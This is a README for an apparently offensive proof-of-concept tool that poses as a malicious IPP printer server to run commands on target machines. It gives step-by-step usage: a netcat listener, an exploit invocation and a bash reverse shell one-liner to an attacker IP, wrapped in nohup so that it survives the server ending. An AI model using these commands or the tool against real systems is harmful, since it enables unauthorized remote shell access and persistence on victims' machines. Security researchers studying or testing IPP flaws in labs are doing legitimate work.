# Exploit - Malicious IPP Reverse Shell Exploit

## Overview
Exploit is a proof-of-concept exploit script that takes advantage of the Internet Printing Protocol (IPP) to execute a remote reverse shell on a target machine. This exploit works by emulating a malicious IPP printer server, sending payloads to vulnerable systems to execute arbitrary commands.

This script has been derived and extended from various sources, including EvilSocket's original exploit script. Modifications have been made to improve reliability and incorporate additional features, such as keeping the reverse shell active even when the IPP server terminates. This was achieved by using `nohup` and background execution (`&`) for payload commands.

## Features
- Uses Python to set up a malicious IPP server that emulates a vulnerable printer.
- Allows remote command execution on a target machine by using the IPP protocol.
- Uses `nohup` to decouple the reverse shell from the main service, keeping the reverse shell alive even when the service is terminated.

## Requirements
- Python 3.x
- ippserver library (install using `pip install ippserver`)
- Netcat (for establishing the reverse shell listener)

## Installation
To use this script, you will need to install the required dependencies.

```bash
pip install ippserver
```

## Usage
To execute the exploit, you will need to run a Netcat listener on your machine to receive the incoming shell from the target. Once the listener is up and running, execute the exploit script to send the payload.

### Step 1: Set Up the Listener
First, set up a Netcat listener on your local machine (the attacker's machine) to wait for the incoming connection from the target machine.

```bash
nc -lvnp 9001
```

### Step 2: Run the Exploit Script
Execute the script with the following parameters:
- `LOCAL_HOST`: Your local IP address (attacker's IP).
- `TARGET_HOST`: The IP address of the target machine.
- `COMMAND`: The command to be executed on the target to create the reverse shell.

Example command:

```bash
python3 exploit.py 10.10.14.12 10.10.11.40 'nohup bash -c "bash -i >& /dev/tcp/10.10.14.12/9001 0>&1" &'
```

### Parameters
- `10.10.14.12`: Your local IP address where you are hosting the malicious IPP server and waiting to receive the shell.
- `10.10.11.40`: The IP address of the target machine.
- `'nohup bash -c "bash -i >& /dev/tcp/10.10.14.12/9001 0>&1" &'`: The command to create a reverse shell, executed in the background to keep the connection alive independently.

### Explanation
- **`nohup`**: Keeps the shell running after the main process exits.
- **`bash -i >& /dev/tcp/10.10.14.12/9001 0>&1`**: Redirects both standard output and standard error to the attacker's machine (`10.10.14.12`) on port `9001`.
- **`&`**: Puts the command into the background, decoupling it from the parent process.

## Script Details
The script sets up an IPP server that emulates a malicious printer with custom attributes. When a request is made by a client to list printer attributes or perform other IPP operations, the server sends back a payload that causes the target machine to execute the specified reverse shell command.

### Main Components
- **MaliciousPrinter Class**: Extends the `StatelessPrinter` class to create a printer that injects malicious attributes. This allows arbitrary command execution.
- **ServerContext Class**: Manages the lifecycle of the IPP server and ensures clean shutdowns.
- **Reverse Shell Execution**: Payload is sent in the printer's response, with `nohup` and background execution (`&`) used to keep the reverse shell alive.

## Credits
- **Arman Sadri (ArmanTheCyber)**: Original adaptation and improvements to make the exploit more reliable.
- **EvilSocket**: Provided the basis for the initial exploit script, which was modified and enhanced in this project.
- **ippsec**: Inspiration for practical exploitation techniques and walkthroughs that helped make this exploit more efficient.
- **CVE Authors**: Acknowledgment to the researchers behind the vulnerabilities leveraged in IPP-based attacks.

## Legal Disclaimer
This script is intended for educational purposes only. Any use of Exploit to target systems without the explicit consent of the system owner is illegal. The author is not responsible for any misuse or damage caused by this script.

## Contributing
If you'd like to contribute to this project or improve its features, feel free to fork the repository and submit a pull request. Any constructive feedback or suggestions are always welcome.

## License
This project is licensed under the MIT License. Please see the `LICENSE` file for more information.

